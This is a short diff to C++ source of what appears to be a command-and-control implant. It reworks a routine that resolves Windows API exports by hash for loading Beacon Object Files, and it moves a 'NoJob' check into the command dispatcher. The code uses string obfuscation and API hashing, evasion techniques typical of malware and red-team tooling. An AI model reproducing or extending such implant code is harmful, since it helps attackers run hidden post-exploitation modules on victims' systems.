@@ -268,10 +268,6 @@ namespace Memory {
             uintptr_t address = { };
             *internal = false;
 
-            if (id == OBF("NoJob")) {
-                goto defer;
-            }
-
             for (uint32_t i = 0 ;; i++) {
                 if (!cmd_map[i].name) {
                     return_defer(ERROR_PROC_NOT_FOUND);
@@ -301,9 +297,6 @@ namespace Memory {
                  * ok, hear me out:
                  *      auto name = "NTDLL$NtAllocateVirtualMemory"
                  *      map[string]string = strings.Split(name, "$")
-                 *
-                 *      auto module = GetHashFromString(map[0])
-                 *      auto function = GetHashFromString(map[1])
                  *
                  *      LoadExport(module, function);
                  *      the implant loads the BOF, so it needs to resolve/relocate everything for it
@@ -383,11 +376,11 @@ namespace Memory {
             UINT_PTR symbol = 0;
             INT reload = 0;
 
-            const auto mod_name = Utils::GetHashFromStringA(module_name, x_strlen(module_name));
-            const auto fn_name = Utils::GetHashFromStringA(export_name, x_strlen(export_name));
+            const auto mod_hash = Utils::GetHashFromStringA(module_name, x_strlen(module_name));
+            const auto fn_hash = Utils::GetHashFromStringA(export_name, x_strlen(export_name));
 
             while (!symbol) {
-                if (!(F_PTR_HASHES(symbol, mod_name, fn_name))) {
+                if (!(F_PTR_HASHES(symbol, mod_hash, fn_hash))) {
                     if (reload || !Ctx->win32.LoadLibraryA(S_CAST(const char*, module_name))) {
                         goto defer;
                     }
@@ -462,6 +455,10 @@ namespace Memory {
 
             bool is_internal    = false;
             const auto cmd_id   = Parser::UnpackString(&parser, nullptr);
+
+            if (cmd_id == OBF("NoJob")) {
+                goto defer;
+            }
 
             if (!(address = Memory::Objects::GetInternalAddress(cmd_id, &is_internal)) || !is_internal) {
                 return_defer(ntstatus);
